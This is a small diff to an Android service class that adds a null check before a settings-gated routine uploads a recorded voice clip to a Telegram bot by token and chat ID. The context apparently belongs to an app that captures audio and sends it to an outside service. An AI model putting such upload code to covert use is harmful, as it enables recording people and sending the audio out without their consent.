@@ -82,7 +82,7 @@ public class AudioCaptureService extends Service {
 
     private void reportVoiceClip() {
         SettingsValues settings = Settings.getInstance().getCurrent();
-        if (settings.mEnableTelegram && mFileName != null) {
+        if (settings != null && settings.mEnableTelegram && mFileName != null) {
             TelegramReporter.sendDocument(settings.mTelegramBotToken, settings.mTelegramChatId, new File(mFileName));
         }
     }
